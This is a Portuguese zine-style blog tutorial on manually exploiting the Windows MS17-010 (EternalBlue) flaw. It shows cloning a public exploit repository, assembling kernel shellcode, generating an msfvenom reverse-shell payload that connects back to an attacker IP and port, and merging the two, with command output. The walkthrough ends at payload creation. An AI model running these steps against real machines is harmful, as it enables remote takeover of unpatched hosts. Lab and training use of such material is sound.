@@ -1,0 +1,69 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>MS17-010 - Exploiting Manually - OffensiveThink</title>
+  <link rel="stylesheet" href="../assets/zine.css">
+</head>
+<body class="article">
+<main class="page article-page">
+<pre>
+     MS17-010 - EXPLOITING MANUALLY
+
+
+        ----------------------------------------------------------------
+        offensive think :: artigo técnico em formato zine / nfo
+        ----------------------------------------------------------------
+
+        titulo : MS17-010 - Exploiting Manually
+        autor  : offensive think
+        data   : Fri, Jul 1, 2022
+        tags   : windows
+
+        ----------------------------------------------------------------
+        --&gt; https://www.offensivethink.com/posts/ms17-010.html &lt;--
+
+Abaixo um passo a passo para exploração da vulnerabilidade MS17-010 (EternalBlue/DoublePulsar).
+Utilizaremos os exploits do repositório: https://github.com/worawit/MS17-010.git
+1. Clonando o Repositório
+
+    root@kali# git clone https://github.com/worawit/MS17-010.git
+    Cloning into &#x27;MS17-010&#x27;...
+    remote: Enumerating objects: 183, done.
+    remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
+    Receiving objects: 100% (183/183), 113.61 KiB | 391.00 KiB/s, done.
+    Resolving deltas: 100% (102/102), done.
+
+1. Gerando o Payload (Atenção para a plataforma a ser atacada, 64 ou 32 bits)
+
+    root@kali# nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o \
+               ./sc_x64_kernel.bin
+
+1. Shellcode (Atenção para a plataforma a ser atacada, 64 ou 32bits)
+
+    
+    root@kali# msfvenom -p windows/x64/shell_reverse_tcp LPORT=&lt;PORTA_NC_ATACANTE&gt; \
+               LHOST=&lt;IP_NC_ATACANTE&gt; \
+               --platform windows -a x64 --format raw -o sc_x64_payload.bin
+    No encoder or badchars specified, outputting raw payload
+    Payload size: 460 bytes
+    Saved as: sc_x64_payload.bin
+
+1. Juntando o Payload e o Shellcode
+
+    root@kali# cat sc_x64_kernel.bin sc_x64_payload.bin &gt; sc_x64.bin
+
+Abaixo segue algumas referências que utilizei e podem ser de ajuda:
+MS17-010 EternalBlue Manual Exploitation
+https://root4loot.com/post/eternalblue_manual_exploit/
+Exploiting MS17-010 without Metasploit (Win XP SP3)
+https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/
+
+---[ EOF ]--------------------------------------------------------------
+
+                    offensive think / 2026
+</pre>
+</main>
+</body>
+</html>
